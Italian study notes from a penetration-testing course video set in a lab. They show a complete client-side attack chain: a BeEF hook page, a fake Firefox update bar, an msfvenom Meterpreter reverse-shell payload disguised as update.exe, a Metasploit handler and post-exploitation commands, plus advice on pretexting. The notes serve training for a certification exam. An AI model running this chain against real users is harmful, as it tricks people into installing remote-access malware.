# 025 — Establishing a Shell Through the Victim's Browser (Client-Side Attacks)

> **Modulo:** Client-Side Attacks · **Video:** 25/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [025_Establishing a Shell Through the Victim's Browser.txt](025_Establishing a Shell Through the Victim's Browser.txt) · [025_Establishing a Shell Through the Victim's Browser.srt](025_Establishing a Shell Through the Victim's Browser.srt)

## Concetti chiave

- **BeEF** (Browser Exploitation Framework) = framework client-side che **"aggancia" (hook)** un browser via uno script JavaScript (`hook.js`) e permette controllo remoto del browser stesso.
- Vettore: pagina HTML attacker-controlled che include `<script src="http://<attacker>:3000/hook.js">`. Quando il target visita la pagina → browser hooked → pannello BeEF lo controlla.
- Tecnica dimostrata: **Fake notification bar** (Firefox-style) che propone update browser → click → download `update.exe` (Meterpreter) → reverse shell.
- **AutoIt** è usato per **simulare l'azione del target** (apertura link in Firefox) — utile solo per il lab, NON è parte dell'attacco reale.
- Il browser usato nel lab è **Firefox Developer Edition** (l'unico che supporta add-on out of the box senza signature check).
- **Browser fingerprinting** (Client Fingerprinting, video 05) è prerequisito: tecniche BeEF dipendono dal browser/OS della vittima.

## Spiegazione approfondita

### Architettura BeEF
```
[Attacker]                            [Victim]
  ├─ beef-xss (porta 3000)              │
  │    ├─ /ui/panel  (control panel)    │
  │    └─ /hook.js   (hook script)      │
  │                                     │
  └─ apache2 (porta 80)                 │
       └─ index.html                    ▼
            └─ <script src=hook.js> ─── Hook fires
                                          ├─ POST to /hook
                                          ├─ Browser → "Online Browsers"
                                          └─ Commands eseguibili dal pannello
```

### Workflow del lab
1. **Avvio BeEF**: `beef-xss` o menu Exploitation Tools → BeEF Start.
   - Output: vari URL utili (panel, hook, ecc.).
2. **Login pannello**: `http://127.0.0.1:3000/ui/panel`, credenziali default lab `beef / password`.
3. **Setup pagina di hook**: creare `/var/www/html/index.html` con `<script src="http://<KALI_IP>:3000/hook.js"></script>` e un po' di pretexting.
4. **Avvio Apache**: `service apache2 start`.
5. **Verifica self-hook**: navigando localmente alla pagina, il browser di Kali compare in "Online Browsers" — utile per test ma non è il target.
6. **Simulazione del target** (AutoIt script sulla VM Windows del lab): apre Firefox alla URL della pagina hook.
7. Una volta hooked, dal pannello BeEF si vede tutto: logs, mouse, keylog parziale, network map, comandi disponibili.

### Pagina HTML minimale di hook
```html
<html>
<head>
  <script src="http://10.10.10.5:3000/hook.js"></script>
</head>
<body>
  <h1>Please update your browser to access the website</h1>
</body>
</html>
```

### AutoIt — simulazione user
Lo script (già pre-installato sulla VM target nel lab) emula l'apertura della URL malevola in Firefox:
```autoit
$path = "C:\Program Files (x86)\Firefox Developer Edition\firefox.exe"
ShellExecute($path, "http://10.10.10.5/")
```
Compilato a EXE (32-bit), si esegue per "fingere" il click del target. NON è l'attacco — è solo emulazione lab.

### Comando BeEF — Fake Notification Bar (Firefox)
Path nel pannello: **Commands → Social Engineering → Fake Notification Bar (Firefox)**.
- Modifica parametri:
  - **Plugin URL** → `http://<KALI_IP>/update.exe` (la nostra `update.exe` ospitata su Apache)
  - **Text** → "Critical: you must update your browser to view this website. Please download and install the update."
- Click su **Execute** → sul browser victim appare la barra "tipo Firefox legittima" che invita ad installare un'estensione/update.

### Generazione del payload "update"
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=<KALI_IP> LPORT=4444 \
         -f exe -o /var/www/html/update.exe
```
Servito da Apache sulla stessa porta 80 della pagina hook.

### Handler Metasploit
```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <KALI_IP>
set LPORT 4444
run -j
```

### Risultato
Vittima clicca "Update" sulla fake notification → scarica `update.exe` → la esegue → Meterpreter session su Kali. Post-ex standard: `sysinfo`, `getuid`, `getprivs`, `getsystem`, `migrate`.

### Altre funzionalità BeEF mostrate (a tour)
- **Logs**: tracking mouse, focus blur, click — utile per browser fingerprinting / capire l'attività del target.
- **Network**: mappa dei hop visibili al browser, IP interno.
- **Commands → Social Engineering**: Fake Notification Bar, Text-to-Voice, Pretty Theft (login fake), Clippy.
- **Commands → Misc**: Get Clipboard (dipende dal browser), Browser AutoPwn (Metasploit integration).
- **Commands → Persistence**: Man-in-the-Browser (rewrite link/intercept submit anche al cambio pagina).
- **Commands → Network**: DNS Enumeration, port scan dal browser via WebRTC.
- **Spoof Address Bar**: cambia URL apparente nella barra (utile a far credere alla vittima di essere su sito legittimo).
- **Browser Autopwn (Metasploit)**: tenta exploit del browser stesso se trova CVE applicabili (NB: dipende dal browser/versione/fingerprint).

### Pretext / Social engineering
Il successo dipende dal **pretesto**: clonare un sito legittimo, mostrare il banner "update browser" come se fosse del sito stesso o di Firefox stesso. Più il banner è coerente con UI legittima, più alta è la conversion.

## Comandi & strumenti

| Comando | Scopo | Note |
|---|---|---|
| `beef-xss` | Avvia BeEF server (porta 3000) | Credenziali in lab doc: `beef:password` |
| `service apache2 start` | Serve la pagina di hook e il payload | |
| `<script src="http://<IP>:3000/hook.js">` | Hook injection nella pagina HTML | Core del meccanismo |
| `msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o /var/www/html/update.exe` | Payload "fake update" | |
| `use exploit/multi/handler` | Handler per la sessione | |
| Pannello → Social Engineering → **Fake Notification Bar (Firefox)** | Comando BeEF specifico per phishing in-browser | Funziona su Firefox |
| Pannello → Misc → **Browser AutoPwn** | Tentativo exploit del browser via MSF | Dipende dal browser/CVE |
| Pannello → Persistence → **Man-in-the-Browser** | Persistenza sull'utente anche cambiando pagina (stesso dominio) | |
| AutoIt: `ShellExecute($path, url)` | Simula apertura link in browser | Solo per lab |

## Esempi pratici

```bash
# 1. Setup BeEF
beef-xss
# Login http://127.0.0.1:3000/ui/panel — beef / password

# 2. Crea pagina di hook
cat > /var/www/html/index.html <<'HTML'
<html><head>
<script src="http://10.10.10.5:3000/hook.js"></script>
</head><body>
<h1>Please update your browser to access the website</h1>
</body></html>
HTML

# 3. Genera payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=10.10.10.5 LPORT=4444 \
         -f exe -o /var/www/html/update.exe

# 4. Avvia Apache + handler
service apache2 start
msfconsole -q -x "use exploit/multi/handler; \
                  set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
                  set LHOST 10.10.10.5; set LPORT 4444; run -j"

# 5. (Simula vittima) Esegui AutoIt EXE sulla VM Windows
#    → Firefox apre http://10.10.10.5/

# 6. Browser appare in BeEF "Online Browsers"
#    Pannello → Commands → Social Engineering → Fake Notification Bar (Firefox)
#    Plugin URL: http://10.10.10.5/update.exe
#    Execute

# 7. Vittima clicca "Update" → scarica update.exe → eseguito → Meterpreter
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getsystem
```

## Punti d'attenzione per l'esame eCPPT

- **BeEF default port**: **3000** (sia panel che hook.js).
- **Hook script**: `http://<BeEF>:3000/hook.js`. Va incluso in `<script src="...">` di una pagina raggiungibile dal target.
- Browser hooking funziona **fino a che la pagina rimane aperta** (a meno di **Man-in-the-Browser**).
- **Browser fingerprinting** è la chiave: dal pannello vedi browser, versione, OS, plugin, ActiveX, Flash, VBScript — usali per scegliere il comando giusto (es. ActiveX solo su IE).
- **Fake Notification Bar (Firefox)**: tecnica social classica, sfrutta la UI legittima per indurre install del "plugin".
- **Browser AutoPwn (Metasploit)**: prova exploit browser, ma molti CVE sono patchati — dipende dal target.
- **Persistence: Man-in-the-Browser**: mantiene controllo anche se l'utente naviga via, rewriting dei link.
- BeEF **non sfrutta CVE per default** — è puro JavaScript hooking + social engineering. Le tecniche browser-exploit sono separate (MSF).
- L'esame può chiedere: porta BeEF? path di hook? Come si embedda? Quale comando in `Commands` per ottenere shell? (→ Fake Notification + payload externo).

## Collegamenti con altri video

- Precedente: [[024_Initial Access Via Spear Phishing Attachment]] — vettore email vs vettore web.
- Prossimo: [[026_Course Conclusion]]
- Prerequisito: [[05_Client Fingerprinting]] — il fingerprinting BeEF parte da qui.
- Concetti: [[03_Client-Side Attack Vectors]]
- Altri vettori: [[019_HTML Applications (HTA)]] · [[020_HTA Attacks]] · [[023_File Smuggling with HTML & JavaScript]]
